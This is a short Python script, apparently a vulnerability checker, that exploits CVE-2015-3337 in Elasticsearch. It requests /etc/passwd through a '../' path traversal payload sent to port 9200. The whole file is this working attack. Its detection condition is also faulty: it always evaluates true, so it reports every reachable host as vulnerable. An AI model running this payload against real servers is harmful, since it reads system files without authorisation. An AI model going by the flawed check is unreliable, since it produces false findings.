"""
@Author: exiashow
@File: es_dir_traversal.py
@Date: 2024/2/29 17:17
@Desc: CVE-2015-3337, ElasticSearch directory traversal
@Summary:
"""

import sys
import requests


class ElasticSearchDirTraversal(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = ":9200/_plugin/head/../../../../../../../../../etc/passwd"
        final_url = self.url + payload

        try:
            conn = requests.get(final_url)
            if "root" or "nologin" in conn.text:
                return "[Warning] Elasticsearch vulnerability discovered: CVE-2015-3337"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == "__main__":
    fallingSword = ElasticSearchDirTraversal(sys.argv[1])
    fallingSword.run()
